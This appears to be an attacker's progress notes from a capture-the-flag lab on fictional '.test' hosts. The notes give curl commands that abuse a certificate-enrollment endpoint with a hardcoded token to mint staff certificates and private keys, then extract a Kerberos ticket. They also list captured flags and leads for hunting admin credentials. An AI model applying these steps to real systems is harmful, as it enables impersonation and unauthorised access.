# ARWC ingress — what is proven, what is dead (2026-11-20 20:57Z)

## Proven working: staff client certificates (this unlocked K19.1/2/3)

```bash
# enroll any @keplerops.test identity; response contains certificate_pem AND private_key_pem
curl -sS -k -X POST \
  -H 'Authorization: Bearer fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9' \
  -H 'Content-Type: application/json' \
  -d '{"upn":"evan.calderoux@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests
```
- Non-`@keplerops.test` subjects → `422 {"error":"invalid_upn"}`.
- Response also carries a `flag` — that is **K19.1** (`FLAG{d4fd346be0ffce16}`) — and the same
  flag comes back for every UPN, so do not resubmit it per identity.
- Use the cert as mTLS: `curl --cacert ca.crt --cert X.crt --key X.key`.
  * `GET /api/archive/handovers/<upn>` → evan.calderoux returns the archive record with
    **K19.2** flag; maya/talia → `handover_not_found`.
  * `POST /api/archive/delegation/probe` with `{"spn":"HTTP/staff.keplerops.test@KEPLEROPS.TEST"}`
    returns a base64 **Kerberos ccache** + **K19.3** flag. Decode to a file, use
    `KRB5CCNAME=FILE:/tmp/evan.ccache klist` — it holds a service ticket for staff only.

## Dead ends (do not repeat)
- `connector.arwc.test` (10.77.60.20) rejects **everything** without a channel identity:
  staff mTLS certs (evan/maya) → `403 channel_identity_denied`;
  SPNEGO with the delegated ccache → `403 channel_identity_denied`.
- Only these relay routes exist: `POST /api/fieldlink/packages/poll`,
  `POST /api/fieldlink/packages/{version}/activate`,
  `GET /api/fieldlink/packages/{version}/receipt`,
  `POST /api/fieldlink/rehearsals/rollback`, `GET|POST /api/fieldlink/diagnostics`
  — all 403 without the channel identity.
- Kerberos tickets exist **only** for `HTTP/staff.keplerops.test`; asking the delegation
  probe for `HTTP/connector.arwc.test`, `HTTP/cloud-api.keplerops.test`,
  `HTTP/workloads.keplerops.test` → `{"error":"ticket_request_failed"}`.
- ARWC has exactly one reachable host (10.77.60.20:22,443). No other 10.77.60–70 hosts.
- `psql service=fieldlink` (rowan_data) can only read `export.partition_bindings`;
  `support.customer_records` and `support.customer_migration_history` are
  `permission denied for schema support` (owned by fieldlink_admin / fieldlink_data_owner).

## Still the most promising leads
1. `fieldlink-admin`-owned data: find a credential for `fieldlink_admin` or
   `fieldlink_data_owner` (k8s secret? Gitea? Jenkins credential store?).
2. The relay's channel identity is probably an **ARWC-issued** certificate/token, not a
   KeplerOps staff identity — look in the customer handover / support attachments.
3. `cert.keplerops.test` exposes only `/health`; `ca.keplerops.test` is the step-ca
   (health 200). The enrollment token is **not** a step JWS, so `step ca certificate
   --token` fails; the staff `/requests` endpoint is the intended path.
